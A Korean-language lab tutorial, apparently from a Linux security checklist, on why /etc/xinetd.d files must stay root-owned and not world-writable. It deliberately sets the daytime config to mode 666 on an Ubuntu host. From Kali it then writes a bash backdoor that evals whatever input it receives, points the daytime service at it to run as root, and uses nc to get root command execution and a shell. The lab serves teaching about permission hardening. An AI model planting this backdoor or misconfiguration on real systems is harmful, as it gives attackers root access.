## /etc/(x)inetd.conf 파일 소유자 및 권한 설정

리눅스의 슈퍼 데몬인 `xinetd`의 설정 파일을 `root` 외의 사용자가 수정할 수 있으면 어떤 문제가 발생할 수 있는지 알아봅시다.

### [우분투 : 취약한 리눅스 서버 관리자] 취약한 시스템을 만듭니다.

A. 우분투 데스크탑 22.04 LTS에는 슈퍼 데몬인 `xinetd`가 설치되어 있지 않습니다. 그러므로 먼저 `xinetd`를 설치합니다.

```
cju@wooam:~$ sudo apt install xinetd
```

B. `xinetd.conf` 파일의 소유자와 접근 권한을 살펴봅시다. 소유자는 `root`이고 접근 권한은 `-rw-r--r--`(644)입니다.

```
cju@wooam:~$ ls -l /etc/xinet.conf
```

C. `xinetd.conf` 파일의 내용도 살펴봅시다. `/etc/xinetd.d` 디렉터리를 포함(`includedir`)하는 것을 확인할 수 있습니다.

```
cju@wooam:~$ cat /etc/xinetd.conf
# Simple configuration file for xinetd
#
# Some defaults, and include /etc/xinetd.d/

defaults
{

# Please note that you need a log_type line to be able to use log_on_success
# and log_on_failure. The default is the following :
# log_type = SYSLOG daemon info

}

includedir /etc/xinetd.d
```

D. `/etc/xinetd.d` 디렉토리를 살펴봅시다. `xinetd`를 통해 서비스될 수 있는 다양한 서비스 설정 파일이 있습니다.

```
cju@wooam:~$ ls /etc/xinetd.d/
chargen  chargen-udp  daytime  daytime-udp  discard  discard-udp  echo  echo-udp  servers  services  time  time-udp
```

E. `/etc/xinetd.d` 디렉터리 안에 있는 설정 파일 중 하나의 접근 권한을 `-rw-rw-rw-`(666)로 변경합니다. 여기서는 `daytime`의 접근 권한을 변경합니다.

```
cju@wooam:~$ sudo chmod 666 /etc/xinetd.d/daytime
```

### [칼리 : 공격자] `xinetd` 자체 `daytime` 서비스 대신 백도어를 올립니다.

> 공격자가 취약한 우분투 데스크탑의 일반 사용자 계정을 탈취했다고 가정합니다.

A. 먼저 일반 사용자 계정을 사용하여 우분투 데스크탑에 원격 접속합니다.

```
┌──(kali㉿kali)-[~]
└─$ ssh aaa@192.168.xxx.xxx 13
```

B. `xinetd` 설정 파일의 접근 권한을 살펴봅시다. `/etc/xinetd.d/daytime` 파일을 누구나 수정할 수 있음을 발견합니다.

```
aaa@wooam:~$ ls -l /etc/xinetd.conf /etc/xinetd.d
```

C. 아래와 같이 간단한 백도어를 만듭니다.

```
aaa@wooam:~$ cat hola
#!/bin/bash
echo "Welcome to the victim server!"
read yourcommand
eval $yourcommand
echo "Thanks you for using this backdoor!"
```

D. 만든 백도어 파일에 실행 권한을 부여합니다.

```
aaa@wooam:~$ chmod 755 hola
```

E. `/etc/xinetd.d/daytime` 파일을 아래와 같이 수정합니다. `disable = no`로 수정하고 `type = INTERNAL` 라인은 삭제합니다. 그리고 `server = /home/aaa/hola`를 추가합니다. 이렇게 설정을 변경하면 `xinetd`는 자체의 `daytime` 서비스를 제공하지 않고 `/home/aaa/hola`의 실행을 통해 서비스를 제공합니다.

```
aaa@wooam:~$ cat /etc/xinetd.d/daytime
# default: off
# description: An internal xinetd service which gets the current system time
# then prints it out in a format like this: "Wed Nov 13 22:30:27 EST 2002".
# This is the tcp version.
service daytime
{
	disable		= no
	id		= daytime-stream
	socket_type	= stream
	protocol	= tcp
	user		= root
	wait		= no
	server		= /home/aaa/hola
}

# This is the udp version.
service daytime
{
	disable		= yes
	type		= INTERNAL
	id		= daytime-dgram
	socket_type	= dgram
	protocol	= udp
	user		= root
	wait		= yes
}

```

F. 원격 접속을 종료합니다.

```
aaa@wooam:~$ exit
```

### [우분투 : 취약한 리눅스 서버 관리자] `xinetd`를 재시작합니다.

A. `xinetd` 서비스를 재시작합니다.

```
cju@wooam:~$ sudo systemctl restart xinetd
```

### [칼리 : 공격자] `daytime` 백도어를 통해 자유롭게 시스템에 접근합니다!

A. `nc` 명령어를 이용하여 백도어에 접근합니다.

```
┌──(kali㉿kali)-[~]
└─$ nc -v 192.168.xxx.xxx 13
192.168.102.128: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.xxx.xxx] 13 (daytime) open
Welcome to the victim server!
whoami
root
Thank you for using this backdoor!
```

B. 셸도 실행할 수 있습니다!

```
┌──(kali㉿kali)-[~]
└─$ nc -v 192.168.xxx.xxx 13
192.168.102.128: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.xxx.xxx] 13 (daytime) open
Welcome to the victim server!
sh
pwd
/
exit
Thank you for using this backdoor!
```